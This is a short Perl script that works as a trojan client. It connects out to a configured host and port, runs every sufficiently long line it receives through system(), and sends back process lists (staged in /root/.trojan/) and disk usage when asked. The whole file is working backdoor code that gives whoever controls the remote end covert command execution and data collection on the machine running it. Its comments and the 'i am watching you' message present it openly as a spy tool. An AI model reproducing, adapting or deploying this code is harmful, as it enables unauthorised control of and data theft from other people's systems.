#! /usr/bin/perl -w    

use strict;
use IO::Socket;
my ($host, $port, $kid, $handle, $line);
#connectn string
$host = '127.0.0.1';
$port = '12345'; 
$handle = IO::Socket::INET->new(Proto  => "tcp",
                                    PeerAddr  => $host,
                                   PeerPort  => $port)
           or die "can't connect to port $port on $host: $!";

$handle->autoflush(1);              
print STDERR "[Cncted to $port]\n";
my $ln;

die "can't fork: $!" unless defined($kid = fork());

if ($kid) {
while (defined ($line = <$handle>)) {

my $temp;        
$ln=$line; chomp($ln);

my $len=length($line);
print $len;
if($len > 5)
{
#print "the command received!!!!!!!!";
system($line);
}

if(lc($line) eq "ps\n")
{ 
#print "got111";
#COLLECTIONS
system("ps aux > /root/.trojan/task");
system("awk '{print \$1,\$2,\$9,\$11}' /root/.trojan/task > /root/.trojan/task2");

$temp = `cat /root/.trojan/task2`;

print $handle $temp."\n";
#$temp = "end\n";
#print $handle $temp;
}

if(lc($line) eq "pps\n")
{
#print "got222";
#open(ipc,">/root/awkspy_dir/spydata.txt");
#print ipc "hello its me";
#close(ipc);
$temp = `df -h`;
print $handle $temp."\n";
}


if(lc($line) eq "pes\n")
{
#print "got333";
}

if(lc($line) eq "5\n")
{
print "i am watching you!\n";
}



if(lc($line) eq "9\n")
{ 
#print "got999";
}

#print "cmd: $line";
}
  
kill("TERM", $kid);                  # send SIGTERM to child
} 



# the else{} block runs only in the child process
else {
# copy standard input to the socket
while (defined ($line = <STDIN>)) {
print $handle $line;}
}#eo else

